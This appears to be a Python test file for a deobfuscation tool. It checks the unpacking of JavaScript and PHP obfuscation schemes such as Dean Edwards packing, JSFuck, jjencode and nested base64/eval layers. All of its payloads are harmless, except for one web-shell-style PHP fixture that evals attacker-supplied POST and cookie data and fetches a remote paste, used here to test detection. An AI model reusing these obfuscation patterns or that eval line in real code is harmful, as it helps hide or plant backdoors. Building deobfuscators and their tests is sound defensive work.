import base64

from evilbox.decode import rc4_crypt
from evilbox.packer import packer_hints
from evilbox.pipeline import deobfuscate
from evilbox.unwrap import _eval_jsfuck, unwrap_dean_edwards, unwrap_jsfuck


DEAN_EDWARDS_BOILERPLATE = (
    "eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;"
    "k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])"
    "p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('%s',%s,%s,'%s'.split('|'),0,{}))"
)


def _pack_dean(code: str, radix: int = 10) -> str:
    words = []
    seen = {}

    def repl(match):
        word = match.group(0)
        if word not in seen:
            seen[word] = len(words)
            words.append(word)
        return _to_base(seen[word], radix)

    import re

    payload = re.sub(r"\b\w+\b", repl, code)
    payload = payload.replace("\\", "\\\\").replace("'", "\\'")
    return DEAN_EDWARDS_BOILERPLATE % (payload, radix, len(words), "|".join(words))


def _to_base(n: int, radix: int) -> str:
    alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if n == 0:
        return alphabet[0]
    out = []
    while n:
        n, rem = divmod(n, radix)
        out.append(alphabet[rem])
    return "".join(reversed(out))


def test_dean_edwards_hello_world():
    src = (
        "eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;"
        "k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])"
        "p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}"
        "('0.1(\\'2 3!\\');',4,4,'console|log|Hello|world'.split('|'),0,{}))"
    )
    text, notes = unwrap_dean_edwards(src)
    assert "console.log('Hello world!');" in text
    assert notes
    result = deobfuscate(src, language="js")
    assert "console.log" in result.text
    assert "Hello world" in result.text
    assert "dean-edwards-packer" in result.packer


def test_dean_edwards_radix62_and_prefix():
    inner = "console.log('packed');"
    packed = "prefix;" + _pack_dean(inner, radix=62) + ";suffix"
    result = deobfuscate(packed, language="js")
    assert "console.log" in result.text
    assert "packed" in result.text
    assert "prefix" in result.text
    assert "suffix" in result.text


def test_dean_edwards_nested():
    inner = "console.log('nested-pack');"
    once = _pack_dean(inner, radix=36)
    twice = _pack_dean(once, radix=36)
    result = deobfuscate(twice, language="js")
    assert "nested-pack" in result.text


def test_javascript_obfuscator_base64_array():
    hello = base64.b64encode(b"hello").decode()
    world = base64.b64encode(b"world").decode()
    src = f"""
var _0x = ['{hello}', '{world}'];
function _0xf(i) {{
  i = i - 0;
  var table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
  return _0x[i];
}}
var x = _0xf(0) + _0xf(1);
"""
    result = deobfuscate(src, language="js")
    assert "hello" in result.text
    assert "world" in result.text
    assert "javascript-obfuscator" in result.packer


def test_javascript_obfuscator_rc4_array():
    key = "k3y!"
    secret = rc4_crypt(b"secret", key.encode("latin-1"))
    assert secret is not None
    blob = base64.b64encode(secret).decode()
    src = f"""
var _0x = ['{blob}'];
function _0xf(i, k) {{
  i = i - 0;
  var table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
  var n = k.charCodeAt(0) % 256;
  return _0x[i];
}}
var x = _0xf(0, '{key}');
"""
    result = deobfuscate(src, language="js")
    assert "secret" in result.text


def test_javascript_obfuscator_function_wrapped_array():
    src = """
function _0x4e() {
  var _0x = ['hello', 'world'];
  _0x4e = function() { return _0x; };
  return _0x4e();
}
function _0xf(i) {
  var a = _0x4e();
  i = i - 0;
  return a[i];
}
var x = _0xf(0) + _0xf(1);
"""
    result = deobfuscate(src, language="js")
    assert "hello" in result.text
    assert "world" in result.text


def test_jsfuck_letter_a():
    val = _eval_jsfuck("(![]+[])[+!+[]]")
    assert val is not None
    assert val.kind == "str"
    assert val.value == "a"


def test_jsfuck_function_payload():
    false = "(![]+[])"
    true = "(!![]+[])"
    undef = "([][[]]+[])"

    def num(n: int) -> str:
        if n == 0:
            return "+[]"
        if n == 1:
            return "+!+[]"
        return "+".join(["!+[]"] * n)

    def get(base: str, i: int) -> str:
        return f"{base}[{num(i)}]"

    filt = "+".join(
        [
            get(false, 0),  # f
            get(undef, 5),  # i
            get(false, 2),  # l
            get(true, 0),  # t
            get(false, 4),  # e
            get(true, 1),  # r
        ]
    )
    native = f"([][{filt}]+[])"
    constructor = "+".join(
        [
            f"{native}[{num(3)}]",  # c
            f"{native}[{num(6)}]",  # o
            get(undef, 1),  # n
            get(false, 3),  # s
            get(true, 0),  # t
            get(true, 1),  # r
            get(true, 2),  # u
            f"{native}[{num(3)}]",  # c
            get(true, 0),  # t
            f"{native}[{num(6)}]",  # o
            get(true, 1),  # r
        ]
    )
    # alert(1)
    payload = "+".join(
        [
            get(false, 1),  # a
            get(false, 2),  # l
            get(false, 4),  # e
            get(true, 1),  # r
            get(true, 0),  # t
            f"{native}[{num(15)}]",  # (
            f"({num(1)}+[])",  # "1"
            f"{native}[{num(16)}]",  # )
        ]
    )
    src = f"[][{filt}][{constructor}]({payload})()"
    text, notes = unwrap_jsfuck(src)
    assert "alert(1)" in text
    assert notes
    result = deobfuscate(src, language="js")
    assert "alert" in result.text
    assert "jsfuck" in result.packer


def test_percent_encoded_bookmarklet():
    src = "%65%76%61%6c%28%61%74%6f%62%28%22%59%32%39%75%63%32%39%73%5a%53%35%73%62%32%63%6f%4a%32%68%70%4a%79%6b%37%22%29%29%3b"
    result = deobfuscate(src, language="js")
    assert "console.log" in result.text


def test_jjencode_hint_and_payload():
    src = (
        '$=~[];$={___:++$,$$$$:(![]+"")[$]};'
        '$.$($.$($.$$+"\\""+"console.log(1);"+"\\"")())();'
    )
    result = deobfuscate(src, language="js")
    assert "console.log(1)" in result.text
    assert "jjencode" in result.packer


def test_sojson_and_fopo_hints():
    js = "/* sojson.v6 jsjiami.com.v7 */ var a=1;"
    assert "sojson-jsjiami" in packer_hints(js)
    php = "<?php /* https://fopo.com.ar/ */ eval(gzuncompress(base64_decode('x')));"
    hints = packer_hints(php)
    assert "fopo" in hints
    assert "eval+gzuncompress" in hints


def test_php_fopo_eval_close_tag_prefix():
    inner = '<?php echo "fopo";'
    b64 = base64.b64encode(inner.encode()).decode()
    src = f'<?php eval("?>".base64_decode(\'{b64}\'));'
    result = deobfuscate(src, language="php")
    assert "fopo" in result.text
    assert "echo" in result.text


def test_php_yakpro_chr_chain():
    src = "<?php eval(chr(101).chr(99).chr(104).chr(111).chr(32).chr(49).chr(59));"
    result = deobfuscate(src, language="php")
    assert "echo" in result.text
    assert "1" in result.text


def test_php_ten_layer_base64_eval():
    payload = b'echo "ten";'
    for _ in range(10):
        payload = base64.b64encode(payload)
    expr = f"'{payload.decode()}'"
    for _ in range(10):
        expr = f"base64_decode({expr})"
    src = f"<?php eval({expr});"
    result = deobfuscate(src, language="php")
    assert "ten" in result.text
    assert "base64_decode" not in result.text


def test_php_concatenated_function_name():
    inner = 'echo "splitfn";'
    b64 = base64.b64encode(inner.encode()).decode()
    src = f'''<?php
$f = "bas" . "e64" . "_dec" . "ode";
eval($f("{b64}"));
'''
    result = deobfuscate(src, language="php")
    assert "splitfn" in result.text
    assert "base64_decode" in result.text
    assert "string-concat" in result.packer


def test_php_concat_assign_dot_equal():
    inner = 'echo "doteq";'
    b64 = base64.b64encode(inner.encode()).decode()
    src = f'''<?php
$f = "bas";
$f .= "e64";
$f .= "_decode";
eval($f("{b64}"));
'''
    result = deobfuscate(src, language="php")
    assert "doteq" in result.text
    assert "base64_decode" in result.text


def test_php_parenthesized_concat_call():
    inner = 'echo "paren";'
    b64 = base64.b64encode(inner.encode()).decode()
    src = f'<?php eval(("bas"."e64"."_decode")("{b64}"));'
    result = deobfuscate(src, language="php")
    assert "paren" in result.text


def test_php_call_user_func_and_nested_codecs():
    import zlib

    payload = b'echo "deep";'
    compressor = zlib.compressobj(wbits=-15)
    raw = compressor.compress(payload) + compressor.flush()
    import codecs as _codecs

    b64 = base64.b64encode(raw).decode()
    rot = _codecs.encode(b64, "rot_13")
    src = f"<?php call_user_func('eval', gzinflate(base64_decode(str_rot13('{rot}'))));"
    result = deobfuscate(src, language="php")
    assert "deep" in result.text
    assert "call_user_func" in result.packer


def test_php_hex2bin_eval():
    payload = "echo 'hexed';"
    hexed = payload.encode().hex()
    src = f"<?php eval(hex2bin('{hexed}'));"
    result = deobfuscate(src, language="php")
    assert "hexed" in result.text
    assert "hex2bin" in result.packer


def test_php_halt_compiler_trailer():
    src = "<?php echo 'before'; __halt_compiler();\n6563686f20276166746572273b"
    result = deobfuscate(src, language="php")
    assert "before" in result.text
    assert "after" in result.text
    assert "halt-compiler" in result.packer


def test_php_bzdecompress():
    import bz2

    payload = b'echo "bz";'
    blob = base64.b64encode(bz2.compress(payload)).decode()
    src = f"<?php eval(bzdecompress(base64_decode('{blob}')));"
    result = deobfuscate(src, language="php")
    assert "bz" in result.text


def test_js_single_quote_hex_and_unescape_u():
    src = r"var a = '\x48\x69'; var b = unescape('%u0061%u006c%u0065%u0072%u0074');"
    result = deobfuscate(src, language="js")
    assert "Hi" in result.text
    assert "alert" in result.text


def test_js_buffer_from_hex_and_eval_hex():
    payload = "console.log(1);"
    hexed = payload.encode().hex()
    src = f'var x = Buffer.from("{hexed}", "hex").toString(); eval("{hexed}");'
    result = deobfuscate(src, language="js")
    assert "console.log" in result.text


def test_js_settimeout_and_window_concat_atob():
    src = 'setTimeout("alert(1)", 0); var x = window["at"+"ob"]("aGk=");'
    result = deobfuscate(src, language="js")
    assert "alert(1)" in result.text
    assert "hi" in result.text


def test_js_paren_concat_callee():
    src = 'var x = ("at"+"ob")("aGk=");'
    result = deobfuscate(src, language="js")
    assert "hi" in result.text


def test_request_driven_and_remote_hints():
    src = '<?php $f = $_POST["x"]; eval($f($_COOKIE["k"])); file_get_contents("https://pastebin.com/raw/x");'
    hints = packer_hints(src)
    assert "request-driven" in hints
    assert "remote-payload" in hints
    assert "variable-function" in hints

